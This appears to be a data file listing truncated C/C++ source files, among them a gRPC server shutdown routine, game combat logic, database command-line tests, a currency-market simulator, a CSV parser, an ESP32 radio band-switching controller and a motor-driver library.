grpc_server_thread([&server]() {\n\t\t\tserver->Wait();\n\t\t\t});\n\n\n\n\t\tboost::asio::io_context io_context;\n\t\tboost::asio::signal_set signals(io_context, SIGINT, SIGTERM);\n\t\t//\u63a5\u53d7\u7cfb\u7edf\u4fe1\u53f7\u540e\u4f18\u96c5\u63a8\u51fa\n\t\tsignals.async_wait([&io_context, pool,&server](auto, auto) {\n\t\t\tio_context.stop();\n\t\t\tpool->Stop();\n\t\t\tserver->Shutdown();\n\t\t\t});\n\n\t\tauto port_str = cfg[\"SelfServer\"][\"Port\"];\n\t\tCServer s(io_context, atoi(port_str.c_str()));\n\t\tio_context.run();\n\n\t\tRedisMgr::GetInstance()->HDel(LOGIN_COUNT, server_name);\n\t\tRedisMgr::GetInstance()->Close();\n\t\tgrpc_server_thread.join();\n\t}\n\tcatch (std::exception& e) {\n\t\tstd::cerr << \"Exception: \" << e.what() << std::endl;\n\t}\n}\n",
    "#include\"EG.h\";                                                                                                                                                                                                                             #include \"EG.h\"\n#include\"Game.h\"\n#include<iostream>;\nusing namespace std;\nostream& operator <<(ostream& out, EG& e)\n{\n\tout << e.getid();\n\treturn out;\n}\n\nvoid EG::attack(Game& g)\n{\n\tg.setEGID(getid());\n\t//cout << \"----THIS IS EARTH GUNNERY ATTACK-------\" << endl;\n\t//cout << \"Power is: \" << getpower() << endl;\n\t//cout << \"Health is: \" << gethealth() << endl;\n\tAlienArmy* aliens = g.getalienarmy();\n\t//cout << \"Capacity is: \" << getattackcap() << endl;\n\tLinkedQueue<AM*> templistmonsters;\n\tint totalcap = getattackcap();\n\tint cap1 = ceil(totalcap / 2);// for monsters///\n\tint cap2 = totalcap - cap1;/// for drones///\n\t//// attacing monsters part////\n\tint x = 0;\n\tint amcount = aliens->getAMcount();\n\tif (cap1 >= aliens->getAMcount())\n\t{\n\t\tx = aliens->getAMcount();\n\t\tcap2 = cap2 + (cap1 - x);// to match full attack capacity///\n\t}\n\telse\n\t{\n\t\tx = cap1;\n\t}\n\tfor (int i = 0; i < x; i++)\n\t{\n\t\t//cout << \"attacking monsters part\";\n\t\tAM* monster = aliens->removeAM();\n\t\tif (monster != nullptr)\n\t\t{\n\t\t\tif (monster->getfirstattacked() == 0)\n\t\t\t{\n\t\t\t\tmonster->setfirstattacked(g.gettimestep());\n\t\t\t}\n\t\t\t//cout << \"HEALTH BEFORE \" <<monster->gethealth()<< endl;\n\t\t\tint damage = ceil((getpower() * gethealth() / 100) / sqrt(monster->gethealth()));\n\t\t\t//cout << \"damage is= \" << damage << endl;\n\t\t\tif (damage >= monster->gethealth())\n\t\t\t{\n\t\t\t\tmonster->sethealth(0);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tmonster->sethealth(monster->gethealth() - damage);\n\t\t\t}\n\t\t\t//cout << \"Health after= \" << monster->gethealth() << endl;\n\t\t\t//cout << \"ID of monster attacked\" << monster->getid() << endl;\n\t\t\tg.addtoattackEG(monster->getid());\n\t\t\tif (monster->gethealth() == 0)\n\t\t\t{\n\t\t\t\t//cout << \"unit is killed\" << endl;\n\t\t\t\tmonster->setdestructed(g.gettimestep());\n\t\t\t\tg.addtokilled(monster);\n\t\t\t\taliens->incrementAM_destruct();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\ttemplistmonsters.enqueue(monster);\n\t\t\t}\n\t\t}\n\t}\n\t//// attacking drones part///\n\t//cout << \"NOW ATTACKING DRONES\" << endl;\n\tint z = 0;\n\tLinkedQueue<AD*> templistdrone;\n\tint adcount = aliens->getADcount();\n\tif (cap2 > aliens->getADcount())\n\t{\n\t\tz = aliens->getADcount();\n\t}\n\telse\n\t{\n\t\tz = cap2;\n\t}\n\tfor (int i = 0; i < z; i++)\n\t{\n\t\tAD* drone1 = nullptr;\n\t\tAD* drone2 = nullptr;\n\t\taliens->removeAD(drone1, drone2);\n\t\tif (drone1 != nullptr && drone2 != nullptr)\n\t\t{\n\t\t\tif (drone1 == drone2)/// this means there is only one drone in the list availble to attack//\n\t\t\t{\n\t\t\t\tif (drone1->getfirstattacked() == 0)\n\t\t\t\t{\n\t\t\t\t\tdrone1->setfirstattacked(g.gettimestep());\n\t\t\t\t}\n\t\t\t\t//cout << \"HEALTH BEFORE\" << drone1->gethealth() <<endl;\n\t\t\t\tint damage1 = ceil((getpower() * gethealth() / 100) / sqrt(drone1->gethealth()));\n\t\t\t\t//cout << \"damage is: \" <<damage1<<endl;\n\t\t\t\tif (damage1 >= drone1->gethealth())\n\t\t\t\t{\n\t\t\t\t\tdrone1->sethealth(0);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tdrone1->sethealth(drone1->gethealth() - damage1);\n\t\t\t\t}\n\t\t\t\t//cout << \"HEALTH AFTER\" << drone1->gethealth() << endl;\n\t\t\t\tg.addtoattackEG(drone1->getid());\n\t\t\t\tif (drone1->gethealth() == 0)\n\t\t\t\t{\n\t\t\t\t\t//cout << \"drone is killed\" << endl;\n\t\t\t\t\tdrone1->setdestructed(g.gettimestep());\n\t\t\t\t\tg.addtokilled(drone1);\n\t\t\t\t\taliens->incrementAD_destruct();\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\ttemplistdrone.enqueue(drone1);\n\t\t\t\t}\n\n\t\t\t}\n\t\t\telse if(drone1!=drone2)\n\t\t\t{\n\t\t\t\t// drone 1//\n\t\t\t\tif (drone1->getfirstattacked() == 0)\n\t\t\t\t{\n\t\t\t\t\tdrone1->setfirstattacked(g.gettimestep());\n\t\t\t\t}\n\t\t\t\t//cout << \"Drone 1:HEALTH BEFORE\"<< drone1->gethealth() << endl;\n\t\t\t\tint damage1 = ceil((getpower() * gethealth() / 100) / sqrt(drone1->gethealth()));\n\t\t\t\t//cout << \"damage is: \" << damage1 << endl;\n\t\t\t\tif (damage1 >= drone1->gethealth())\n\t\t\t\t{\n\t\t\t\t\tdrone1->sethealth(0);\n\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tdrone1->sethealth(drone1->gethealth() - damage1);\n\t\t\t\t}\n\t\t\t\t//cout << \"drone 1: HEALTH AFTER\" <<drone1->gethealth()<< endl;\n\t\t\t\tg.addtoattackEG(drone1->getid());\n\t\t\t\tif (drone1->gethealth() == 0)\n\t\t\t\t{\n\t\t\t\t\t//cout << \"drone1 is killed\" << endl;\n\t\t\t\t\tdrone1->setdestructed(g.gettimestep());\n\t\t\t\t\tg.addtokilled(drone1);\n\t\t\t\t\taliens->incrementAD_destruct();\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\ttemplistdrone.enqueue(drone1);\n\t\t\t\t}\n\t\t\t\t// drone2///\n\t\t\t\tif (drone2->getfirstattacked() == 0)\n\t\t\t\t{\n\t\t\t\t\tdrone2->setfirstattacked(g.gettimestep());\n\t\t\t\t}\n\t\t\t\t//cout << \"drone 2: HEALTH BEFORE\" << drone2->gethealth()<< endl;\n\t\t\t\tint damage2 = ceil((getpower() * gethealth() / 100) / sqrt(drone2->gethealth()));\n\t\t\t\t//cout << \"damage is: \" << damage1 << endl;\n\t\t\t\tif (damage2 >= drone2->gethealth())\n\t\t\t\t{\n\t\t\t\t\tdrone2->sethealth(0);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tdrone2->sethealth(drone2->gethealth() - damage2);\n\t\t\t\t}\n\t\t\t\t//cout << \"drone2: HEALTH AFTER\" <<drone2->gethealth()<< endl;\n\t\t\t\tg.addtoattackEG(drone2->getid());\n\t\t\t\tif (drone2->gethealth() == 0)\n\t\t\t\t{\n\t\t\t\t\t//cout << \"drone 2 is killed\" << endl;\n\t\t\t\t\tdrone2->setdestructed(g.gettimestep());\n\t\t\t",
    "#include <gtest/gtest.h>\n// #include <bits/stdc++.h>\n#include <fstream>\n#include <stdio.h>\n#include <cstdio> \n\n#ifdef _WIN32\n#define popen _popen\n#define pclose _pclose\n#endif\n\n#define USERNAME_SIZE 32 // username\u5b57\u6bb5 4 byte\n#define EMAIL_SIZE 255 // email\u5b57\u6bb5 4 byte\n\n// \u4f9d\u6b21\u6267\u884c commands \u4e2d\u7684\u547d\u4ee4 \u5e76\u8fd4\u56de\u6240\u6709\u8f93\u51fa\nstd::vector<std::string> run_script(const std::vector<std::string>& commands) {\n    std::vector<std::string> output;\n    std::string temp_filename = \"temp_script.txt\";\n\n    // Create a temporary script file\n    std::ofstream script_file(temp_filename);\n    for (const auto& command : commands) {\n        script_file << command << \"\\n\";\n    }\n    script_file.close();\n\n    // Execute the script and capture output\n    std::string command = \"./rundb < \" + temp_filename;\n    #ifdef _WIN32\n      command = \"rundb.exe < \" + temp_filename;\n    #endif\n    std::ostringstream raw_output;\n    FILE* pipe = popen(command.c_str(), \"r\");\n    if (!pipe) {\n        throw std::runtime_error(\"Failed to execute script\");\n    }\n    char buffer[128];\n    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {\n        raw_output << buffer;\n    }\n    pclose(pipe);\n\n    // Remove the temporary file\n    std::remove(temp_filename.c_str());\n\n    // Split output into lines\n    std::istringstream output_stream(raw_output.str());\n    std::string line;\n    while (std::getline(output_stream, line)) {\n        output.push_back(line);\n    }\n\n    return output;\n}\n\n// \u5355\u4e2ainsert\nTEST(DBtestCmd, InsertOneAndSelectAll) {\n    // \u6a21\u62df\u7528\u6237\u8f93\u5165\n    std::vector<std::string> commands = {\n        \"insert 1 user1 person1@example.com\",\n        \"select\",\n        \".exit\",\n    };\n    // \u5b58\u653e\u7a0b\u5e8f\u7684\u771f\u5b9e\u8f93\u51fa\n    std::vector<std::string> result = run_script(commands);\n    // \u5b58\u653e\u6b63\u786e\u7684\u7a0b\u5e8f\u8f93\u51fa\n    std::vector<std::string> expected = {\n        \"db > Executed\",\n        \"db > \",\n        \"(1, user1, person1@example.com)\",\n        \"Executed\",\n        \"db > \",\n    };\n    // \u68c0\u67e5\u8f93\u51fa\n    EXPECT_EQ(result.size(), expected.size());\n    for(int i=0;i<result.size();i++){\n        EXPECT_EQ(result[i], expected[i]);\n    }\n}\n\n// \u5355\u4e2ainsert \u4f46username\u548cemail\u957f\u5ea6\u6700\u5927\nTEST(DBtestCmd, InsertOneLongAndSelectAll) {\n    // \u6a21\u62df\u7528\u6237\u8f93\u5165\n    std::string long_username, long_email;\n    for(int i=0;i<USERNAME_SIZE-1;i++) long_username += \"a\";\n    for(int i=0;i<EMAIL_SIZE-1;i++) long_email += \"b\";\n    std::string insert_cmd = \"insert 1 \" + long_username + \" \" + long_email;\n\n    std::vector<std::string> commands = {\n        insert_cmd,\n        \"select\",\n        \".exit\",\n    };\n\n    // \u5b58\u653e\u7a0b\u5e8f\u7684\u771f\u5b9e\u8f93\u51fa\n    std::vector<std::string> result = run_script(commands);\n\n    // \u5b58\u653e\u6b63\u786e\u7684\u7a0b\u5e8f\u8f93\u51fa\n    std::string the_only_row = \"(1, \" + long_username + \", \" + long_email + \")\";\n    std::vector<std::string> expected = {\n        \"db > Executed\",\n        \"db > \",\n        the_only_row,\n        \"Executed\",\n        \"db > \",\n    };\n    // \u68c0\u67e5\u8f93\u51fa\n    EXPECT_EQ(result.size(), expected.size());\n    for(int i=0;i<result.size();i++){\n        EXPECT_EQ(result[i], expected[i]);\n    }\n}\n\n// \u5355\u4e2ainsert \u4f46username\u548cemail\u957f\u5ea6\u8fc7\u5927(\u4e0d\u5408\u6cd5)\nTEST(DBtestCmd, InsertOneTooLongAndSelectAll) {\n    // \u6a21\u62df\u7528\u6237\u8f93\u5165\n    std::string long_username, long_email;\n    for(int i=0;i<USERNAME_SIZE;i++) long_username += \"a\";\n    for(int i=0;i<EMAIL_SIZE;i++) long_email += \"b\";\n    std::string insert_cmd = \"insert 1 \" + long_username + \" \" + long_email;\n\n    std::vector<std::string> commands = {\n        insert_cmd,\n        \"select\",\n        \".exit\",\n    };\n\n    // \u5b58\u653e\u7a0b\u5e8f\u7684\u771f\u5b9e\u8f93\u51fa\n    std::vector<std::string> result = run_script(commands);\n\n    // \u5b58\u653e\u6b63\u786e\u7684\u7a0b\u5e8f\u8f93\u51fa\n    std::string the_only_row = \"(1, \" + long_username + \", \" + long_email + \")\";\n    std::vector<std::string> expected = {\n        \"db > Invalid_args: too long or wrong type or negative\",\n        \"db > \",\n        \"Executed\",\n        \"db > \",\n    };\n    // \u68c0\u67e5\u8f93\u51fa\n    EXPECT_EQ(result.size(), expected.size());\n    for(int i=0;i<result.size();i++){\n        EXPECT_EQ(result[i], expected[i]);\n    }\n}\n\n// \u5355\u4e2ainsert \u4f46id\u4e3a\u8d1f\u6570(\u4e0d\u5408\u6cd5)\nTEST(DBtestCmd, InsertOneNegativeAndSelectAll) {\n    // \u6a21\u62df\u7528\u6237\u8f93\u5165\n    std::vector<std::string> commands = {\n        \"insert -1 user1 person1@example.com\",\n        \"select\",\n        \".exit\",\n    };\n    // \u5b58\u653e\u7a0b\u5e8f\u7684\u771f\u5b9e\u8f93\u51fa\n    std::vector<std::string> result = run_script(commands);\n    // \u5b58\u653e\u6b63\u786e\u7684\u7a0b\u5e8f\u8f93\u51fa\n    std::vector<std::string> expected = {\n        \"db > Invalid_args: too long or wrong type or negative\",\n        \"db > \",\n        \"Executed\",\n        \"db > \",\n    };\n    // \u68c0\u67e5\u8f93\u51fa\n    EXPECT_EQ(result.size(), expected.size());\n    for(int i=0;i<result.size();i++){\n        EXPECT_EQ(result[i], expected[i]);\n    }\n}\n\n// \u591a\u4e2ainsert \u4f46\u4e0d\u8d85\u8fc7table\u5bb9\u91cf\nTEST(DBtestCmd, InsertManyAndSelectAll) {\n    std::vector<std::string> commands;\n    for(int i=1;i<=1000;i++){\n      commands.push_back(\"insert \" + std::to_string(i) + \" user\" + std::to_string(i) +\n                         \" person\" + std::to_string(i) + \"@example.com\");\n    }\n    commands.push_back(\"select\");\n    commands.push_back(\".exit\");\n\n    std::vector<std::string> result = run_script(commands);\n    std::vector<std::string> expected;\n    for(int i=1;",
    "#include \"events.h\"\n#include <memory>\n#include \"market.h\"\n\nvoid Events::inflation(const std::string& currencyName)\n{\n\tfor (Currency* currency : currencies)\n\t{\n\t\tif (currency->getName() == currencyName)\n\t\t{\n\t\t\tdouble inflationRate = currency->getVolatility();\n\t\t\tdouble newSupply = currency->getSupply() * (1 + inflationRate);\n\t\t\tcurrency->setSupply(newSupply);\n\n\t\t\tdouble newValue = currency->getDemand() / newSupply;\n\t\t\tcurrency->setValue(newValue);\n\t\t}\n\t}\n\tif (mkt) {\n\t\tmkt->updateMakert();\n\t\tmkt->displayMarket(actived);\n\t}\n\tsetActived(true);\n}\nvoid Events::interestRate(const std::string& currencyGovernment)\n{\n\tfor(Currency* currency : currencies)\n\t{\n\t\tif(currency->getGovernment() == currencyGovernment)\n\t\t{\n\t\t\tdouble demand = currency->getDemand();\n\t\t\tdouble supply = currency->getSupply();\n\t\t\tdouble volatility = currency->getVolatility();\n\t\t\tdouble inflation = 0.04; // depois tenho que mudar pra deixar o valor da infla\u00e7\u00e3o dinamico nesta fun\u00e7\u00e3o\n\t\t\tdouble economicGrowth = 0.02; // depois tenho que mudar pra deixar o valor do crescimento econ\u00f4mico dinamico nesta fun\u00e7\u00e3o\n\n\t\t\tdouble interestRate = 0.01 * demand / supply + 0.02 * volatility + 0.0005 * inflation - 0.003 * economicGrowth;\n\n\t\t}\n\t}\n\tif (mkt) {\n\t\tmkt->updateMakert();\n\t\tmkt->displayMarket(actived);\n\t}\n\tsetActived(true);\n}\nvoid Events::publicDebt(const std::string& currencyGovernment, const std::string& currencyDebtGovernment, double debt)\n{\n\tstd::random_device rd;\n\tstd::mt19937 gen(rd());\n\tstd::uniform_real_distribution<> dis(1.4, 2.4);\n\n\tdouble randomFees = dis(gen);\n\tCurrency* governmentCurrency = nullptr;\n\tCurrency* debtCurrency = nullptr;\n\n\tfor(Currency* currency : currencies)\n\t{\n\t\t\n\n\t\tif(currency->getGovernment() == currencyGovernment)\n\t\t{\n\t\t\tgovernmentCurrency = currency;\n\t\t}\n\t\telse if (currency->getGovernment() == currencyDebtGovernment)\n\t\t{\n\t\t\tdebtCurrency = currency;\n\t\t}\n\t\tif(governmentCurrency && debtCurrency)\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\tif(!governmentCurrency || !debtCurrency)\n\t{\n\t\tstd::cerr << \"Erro: N\u00e3o foi poss\u00edvel encontrar as moedas especificadas.\" << std::endl;\n\t}\n\tif (debt > governmentCurrency->getDebt()) {\n\t\tstd::cerr << \"voce nao pode pagar mais do que deve voce pagou apenas a sua divida.\" << std::endl;\n\t\tdebt = governmentCurrency->getDebt();\n\t}\n\tdouble convertCurrency = debt * governmentCurrency->getValue() / debtCurrency->getValue();\n\tdouble newSupplyGovernment = debtCurrency->getSupply() + convertCurrency;\n\tdebtCurrency->setSupply(newSupplyGovernment);\n\n\tdouble newCurrencySupply = governmentCurrency->getSupply() - convertCurrency;\n\tgovernmentCurrency->setSupply(newCurrencySupply);\n\n\tgovernmentCurrency->setDebt(0);\n\n\tif (mkt) {\n\t\tmkt->updateMakert();\n\t\tmkt->displayMarket(actived);\n\t}\n\tsetActived(true);\n\n}\nvoid Events::governmentLoan(const std::string& currencyGovernment, const std::string& currencyLoanGovernment, double loan)\n{\n\tCurrency* governmentCurrency = nullptr;\n\tCurrency* loanCurrency = nullptr;\n\n\tfor (Currency* currency : currencies)\n\t{\n\t\tif (currency->getGovernment() == currencyGovernment)\n\t\t{\n\t\t\tgovernmentCurrency = currency;\n\t\t}\n\t\telse if (currency->getGovernment() == currencyLoanGovernment)\n\t\t{\n\t\t\tloanCurrency = currency;\n\t\t}\n\n\t\tif (governmentCurrency && loanCurrency)\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (!governmentCurrency || !loanCurrency)\n\t{\n\t\tstd::cerr << \"Erro: Nao foi poss\u00edvel encontrar as moedas especificadas.\" << std::endl;\n\t\treturn;\n\t}\n\tif (loan > loanCurrency->getSupply()) {\n\t\tstd::cerr << \"Erro: Nao e possivel emprestar mais do que voce tem!\" << std::endl;\n\t\treturn;\n\t}\n\tdouble convertedLoan = loan * loanCurrency->getValue() / governmentCurrency->getValue();\n\n\tdouble newSupplyGovernment = governmentCurrency->getSupply() + convertedLoan;\n\tdouble newSupplyLoan = loanCurrency->getSupply() - loan;\n\n\tgovernmentCurrency->setSupply(newSupplyGovernment);\n\tgovernmentCurrency->setDebt(loan);\n\n\tloanCurrency->setSupply(newSupplyLoan);\n\n\tif (mkt) {\n\t\tmkt->updateMakert();\n\t\tmkt->displayMarket(actived);\n\t}\n\tsetActived(true);\n\t\n}\nvoid Events::underDemand(const std::string& currencyGovernment)\n{\n\tfor(Currency* currency : currencies)\n\t{\n\t\tif(currency->getGovernment() == currencyGovernment)\n\t\t{\n\t\t\tif (currency->getDemand() < currency->getSupply()) {\n\t\t\t\tstd::cerr << \"a demanda ja e menor que a oferta\" << std::endl;\n\t\t\t\tif (mkt) {\n\t\t\t\t\tmkt->updateMakert();\n\t\t\t\t\tmkt->displayMarket(actived);\n\t\t\t\t}\n\t\t\t\tsetActived(true);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (currency->getDemand() > currency->getSupply()) {\n\t\t\t\tdouble underDemand = floor(currency->getDemand() - currency->getSupply() * 0.9);\n\t\t\t\tdouble newDemand = currency->getDemand() - underDemand;\n\t\t\t\tcurrency->setDemand(newDemand);\n\t\t\t\tcurrency->setValue(newDemand);\n\t\t\t\tif (mkt) {\n\t\t\t\t\tmkt->updateMakert();\n\t\t\t\t\tmkt->displayMarket(actived);\n\t\t\t\t}\n\t\t\t\tsetActived(true);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tdouble demandShock = currency->getSupply() * 0.1;\n\t\t\tdouble newDemand = currency->getDemand() - demandShock;\n\t\t\tcurrency->setDemand(newDemand);\n\t\t\tdouble newValue = currency->getDemand() / currency->getSupply();\n\t\t\tcurrency->setVal",
    "#include \"../include/DataPreprocessing.h\"\n\n\n\nnamespace DataPreprocessor {\n\n    vector<vector<string> > readCSV(const string& file_path) {\n           vector<vector<string> > data;\n           ifstream file(file_path);\n\n           if (!file.is_open()) {\n               cerr << \"Error: Could not open file \" << file_path << endl;\n               return data;\n           }\n\n           string line;\n           while (getline(file, line)) {\n               vector<string> row;\n               string cell;\n               bool inQuotes = false;\n               bool cellStarted = false;\n\n               for (size_t i = 0; i < line.length(); ++i) {\n                   char c = line[i];\n\n                   if (inQuotes) {\n                       if (c == '\"') {\n                           // Check if this is an escaped quote\n                           if (i + 1 < line.length() && line[i + 1] == '\"') {\n                               cell += '\"'; // Add a single quote\n                               ++i; // Skip the next quote\n                           } else {\n                               inQuotes = false; // End of quoted field\n                           }\n                       } else {\n                           cell += c;\n                       }\n                   } else {\n                       if (c == '\"') {\n                           inQuotes = true;\n                           if (cell.empty()) {\n                               // Starting a quoted field\n                               cellStarted = true;\n                           } else {\n                               // Quote character in the middle of a field\n                               cell += c;\n                           }\n                       }\n                       else if (c == ',') {\n                           // End of cell\n                           row.push_back(cell);\n                           cell.clear();\n                           cellStarted = false;\n                       }\n                       else {\n                           cell += c;\n                       }\n                   }\n               }\n\n               // Add the last cell\n               row.push_back(cell);\n               data.push_back(row);\n           }\n\n           file.close();\n           return data;\n       }\n\n       // Function to remove specified columns from data and labels\n         void removeColumns(\n             vector<string>& labels,\n             const vector<string>& colsToRemove,\n             vector<vector<string> >& data\n         ) {\n             vector<int> indicesToRemove;\n\n             // Step 1: Find indices of columns to remove\n             for (const auto& col : colsToRemove) {\n                 auto it = std::find(labels.begin(), labels.end(), col);\n                 if (it != labels.end()) {\n                     int index = std::distance(labels.begin(), it);\n                     indicesToRemove.push_back(index);\n                 } else {\n                     cerr << \"Warning: Column \\\"\" << col << \"\\\" not found in labels.\\n\";\n                 }\n             }\n\n             // Step 2: Sort indices in descending order to prevent shifting issues\n             sort(indicesToRemove.begin(), indicesToRemove.end(), std::greater<int>());\n\n             // Step 3: Remove columns from labels and each row in data\n             for (int idx : indicesToRemove) {\n                 if (idx >= 0 && idx < labels.size()) {\n                     // Remove from labels\n                     labels.erase(labels.begin() + idx);\n\n                     // Remove from each row in data\n                     for (auto& row : data) {\n                         if (idx >= 0 && idx < row.size()) {\n                             row.erase(row.begin() + idx);\n                         } else {\n                             cerr << \"Warning: Row size is smaller than expected.\\n\";\n                         }\n                     }\n                 } else {\n                     cerr << \"Error: Invalid index \" << idx << \" for removal.\\n\";\n                 }\n             }\n         }\n\n\n\n    // A simple trim function to remove leading/trailing whitespace\n    static inline string trim(const string &s) {\n        if (s.empty()) return s;\n\n        size_t start = 0;\n        while (start < s.size() && isspace((unsigned char)s[start])) {\n            ++start;\n        }\n\n        size_t end = s.size() - 1;\n        while (end > start && isspace((unsigned char)s[end])) {\n            --end;\n        }\n\n        return s.substr(start, end - start + 1);\n    }\n\n    // Main function to remove BOM, trim cells, and print the \"head\" of the data\n    vector<string> processAndClean(vector<vector<string> >& data) {\n\n        if (data.empty()) {\n                throw std::invalid_argument(\"Data is empty; cannot process or clean.\");\n            }\n\n\n        // 1. Remove BOM and trim all cells\n        for (auto& row : data) {\n            for (auto& cell : row) {\n                // Check for UTF-8 BOM (0xEF, 0xBB, 0xBF) at the start of the stri",
    "/*\n *   IC905_ESP32-S3_PTT_Breakout.cpp\n *   Jan 2025 by K7MDL\n *\n *  This program is a USB Host Serial device that reads the CI_V frequency messages (and some other data) from the radio\n *  for the purpose of activating a selected band output and PTT output unique to each band.\n *  \n *  The program currently supports 6 bands and different model Icom radios, these will have different bands. \n *  The default band table is for the IC-905.  Upon detecting the radio's CI-V address at startup, \n *  the appropriate band table content is copied into the band table.\n *  \n *  For 10GHz and higher bands the IC-905 adds 1 extra byte that must be accounted for to decode the BCD encoded frequency\n *  The last data byte sent for frequency is the MSB.\n *\n *  The radio PTT line (aka SEND output) is wired into this CPU and monitored.  There is a status LED for it.\n *  There are 6 PTT and 6 band enable outputs, with status LEDs for each band\n *  There is a power LED.  It is assigned for power status but can be used for anything as all LEDs are PWM and assignable.\n * \n *  PTT is normally +5V if directly connected to the SEND jack with a weak pullup at the radio and at the CPU sides\n *  When PTT = 0 (radio is in TX) then we use the last frequency seen and send logic 1 to the matching band's PTT output.\n *  A ULN2803A open collector octal driver buffers the CPU outputs and also inverts so a logic 1 results in closure to GND.\n * \n *  Support for the AtomS3 is enabled by a #define ATOMS3. It has no I/O support in this code today but has a nice\n *  small color LCD that displays frequency, time/date from radio, BAND, TX status, and location.\n *  I calculate an 8 digit grid square and display it in the debug and on an optional display like the AtomsS3\n *\n *  On bootup the radio is polled for time, location, band/frequency, mode, extended mode, and UTC offset.  \n *  After that it listens for messages only so it does not interfere with PC to Radio CI_V serial bridging between the 2 USB serial ports\n * \n *  The 2nd USB serial port is presented at TTL level on a jack on the PCB. \n *  This, or other hardware serial port pins may be brought out to a connector and with appropriate level shifting\n *  used for analog to USB CI-V bridging.   Use #define CIV_SERIAL to enable this mode which also shuts off all debug output.\n * \n *  ---------------------------------------------------------------------------------\n * The USB Serial Host part of this program is based on cdc_acm_host example file from \n * \n * SPDX-FileCopyrightText: 2015-2023 Espressif Systems (Shanghai) CO LTD\n *\n * SPDX-License-Identifier: CC0-1.0\n */\n\n#include \"IC905_ESP32-S3_PTT_Breakout.h\"\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <inttypes.h>\n#include \"esp_system.h\"\n#include \"esp_log.h\"\n#include \"esp_err.h\"\n#include \"freertos/FreeRTOS.h\"\n#include \"freertos/task.h\"\n#include \"freertos/semphr.h\"\n#include \"freertos/queue.h\"\n#include \"freertos/event_groups.h\"\n#include \"driver/gpio.h\"\n#include \"driver/gpio_filter.h\"\n#include \"esp_timer.h\"\n#include \"usb/usb_host.h\"\n#include \"usb/cdc_acm_host.h\"\n#include \"time.h\"\n#include <sys/time.h>\n#include \"driver/ledc.h\"\n#include \"esp_adc/adc_oneshot.h\"\n#include \"esp_adc/adc_cali.h\"\n#include \"esp_adc/adc_cali_scheme.h\"\n#include \"driver/uart.h\"\n#include \"led_strip.h\"\n\n#include \"Decoder.h\"\n#include \"CIV.h\"\n#include \"LED_Control.h\"\n\n// Our own functions\nvoid display_Freq(uint64_t _freq, bool _force);\nvoid display_Time(uint8_t _UTC, bool _force);\nvoid display_PTT(bool _PTT_state, bool _force);\nvoid display_Band(uint8_t _band, bool _force);\nvoid display_Grid(char _grid[], bool _force);\nvoid SetFreq(uint64_t Freq);\nvoid poll_for_time(void);\nvoid read_BSTACK_from_Radio(uint8_t band, uint8_t reg);\nvoid blink_led(uint8_t s_led_state, char color);\nint sendData2(const char* logName, const char* data);\n\n// default band table.  This will be overwritten depending on what radio CIV address is detected\nstruct Bands bands[NUM_OF_BANDS] = {\n    { \"DUMMY\", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF },                                       // DUMMY Band to avoid using 0\n    { \"2M\", 144000000, 148000000, 0, 144200000, 1, 1, 0, 1, 0, 0, 0, DECODE_INPUT_BAND144 },                  // 2m\n    { \"70cm\", 430000000, 450000000, 0, 432100000, 1, 1, 0, 1, 0, 0, 0, DECODE_INPUT_BAND430 },                // 430/440  No LO\n    { \"23cm\", 1240000000, 1300000000, 0, 1296100000, 1, 1, 0, 1, 0, 0, 0, DECODE_INPUT_BAND1200 },            // 1296Mhz  with 144Mhz LO\n    { \"13cm\", 2300000000, 2450000000, 0, 2304100000, 1, 1, 0, 1, 0, 0, 0, DECODE_INPUT_BAND2300 },            // 2.3 and 2.4GHz\n    { \"6cm\",  5650000000, 5925000000, 0, 5760100000, 1, 1, 0, 1, 0, 0, 0, DECODE_INPUT_BAND5600 },            // 5.7GHz\n    { \"3cm\", 10000000000, 10500000000, 0, 10368100000, 1, 1, 0, 1, 0, 0, 0, DECODE_INPUT_BAND10G }           // 10GHz\n};\n\n// IC-905 and IC-9700 config\nconst struct Bands bands_905[NUM_OF_BANDS] = {\n    { \"DUMMY\", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF },         ",
    "/*\nOriginal written by:\n  08/05/17  Idris, Cytron Technologies\n*/\n\n#include \"Cytron_SmartDriveDuo.h\"\n\n/*\nCytron_SmartDriveDuo::Cytron_SmartDriveDuo(int mode, int rc1Pin, int rc2Pin)\n{\n  _mode = mode;\n  _rc1Pin = rc1Pin;\n  _rc2Pin = rc2Pin;\n\n  pinMode(_rc1Pin, OUTPUT);\n  pinMode(_rc2Pin, OUTPUT);\n}\n*/\n\nCytron_SmartDriveDuo::Cytron_SmartDriveDuo(int mode, int in1Pin, int in2Pin, int an1Pin, int an2Pin)\n{\n  _mode = mode;\n  _an1Pin = an1Pin;\n  _an2Pin = an2Pin;\n  _in1Pin = in1Pin;\n  _in2Pin = in2Pin;\n  \n  pinMode(_an1Pin, OUTPUT);\n  pinMode(_an2Pin, OUTPUT);\n  pinMode(_in1Pin, OUTPUT);\n  pinMode(_in2Pin, OUTPUT);\n}\n\nboolean hardwareSerial;\nCytron_SmartDriveDuo::Cytron_SmartDriveDuo(int mode, int txPin, uint32_t baudrate)\n{\n  _mode = mode;\n  _txPin = txPin;\n\n  if (_txPin == 1) {\n    hardwareSerial = true;\n    Serial.begin(baudrate);\n    while (!Serial);\n  }\n  else {\n    hardwareSerial = false;\n    pinMode(_txPin, OUTPUT);\n    MDDSSerial = new SoftwareSerial(_rxPin, _txPin);\n    MDDSSerial->begin(baudrate);\n  }\n}\n\nCytron_SmartDriveDuo::Cytron_SmartDriveDuo(int mode, int txPin, int boardId, uint32_t baudrate)\n{\n  _mode = mode;\n  _txPin = txPin;\n  _boardId = boardId;\n\n  if (_txPin 